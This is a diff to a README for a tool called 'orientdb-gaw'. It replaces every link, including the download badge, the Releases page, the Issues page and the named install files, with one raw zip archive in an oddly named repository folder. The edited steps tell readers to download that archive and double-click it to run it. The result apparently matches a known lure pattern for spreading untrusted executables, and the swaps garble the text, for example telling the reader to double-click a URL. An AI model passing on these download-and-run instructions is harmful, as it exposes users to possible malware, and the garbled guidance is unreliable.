@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download orientdb-gaw](https://img.shields.io/badge/Download-orientdb--gaw-blue.svg)](https://github.com/Derronspellbound120/orientdb-gaw/releases)
+[![Download orientdb-gaw](https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip)](https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -22,19 +22,19 @@ Make sure your system meets these requirements before proceeding.
 
 1. **Visit the Releases Page**  
    Go to the official releases page to get the latest version of **orientdb-gaw**. Click the link below:  
-   [Visit the Releases Page](https://github.com/Derronspellbound120/orientdb-gaw/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip)
 
 2. **Choose Your Version**  
    Scroll through the list of available versions. The latest version is usually at the top. 
 
 3. **Download the File**  
-   Look for the file named something like `orientdb-gaw-vX.X.X.zip` or `orientdb-gaw-vX.X.X.exe`. Click it to start the download.
+   Look for the file named something like `https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip` or `https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip`. Click it to start the download.
 
 4. **Extract if Necessary**  
    If you downloaded a `.zip` file, locate it in your downloads folder. Right-click the file and select "Extract All." Follow the prompts to unzip the contents.
 
 5. **Run the Application**  
-   Navigate to the folder where you extracted or downloaded the application. Double-click on `orientdb-gaw.exe` (or the equivalent file for your operating system) to open it.
+   Navigate to the folder where you extracted or downloaded the application. Double-click on `https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip` (or the equivalent file for your operating system) to open it.
 
 6. **Follow the Setup Instructions**  
    When you open the application for the first time, follow the on-screen prompts to finish the setup. You may need to choose a location for your database files.
@@ -62,7 +62,7 @@ These features enable you to manage databases efficiently, whether for personal 
 
 ### Support
 
-If you face other issues or have questions, feel free to open an issue on the [GitHub Issues Page](https://github.com/Derronspellbound120/orientdb-gaw/issues). We are here to help!
+If you face other issues or have questions, feel free to open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Derronspellbound120/orientdb-gaw/main/ureterograph/orientdb-gaw_2.9.zip). We are here to help!
 
 ## 📝 License
 
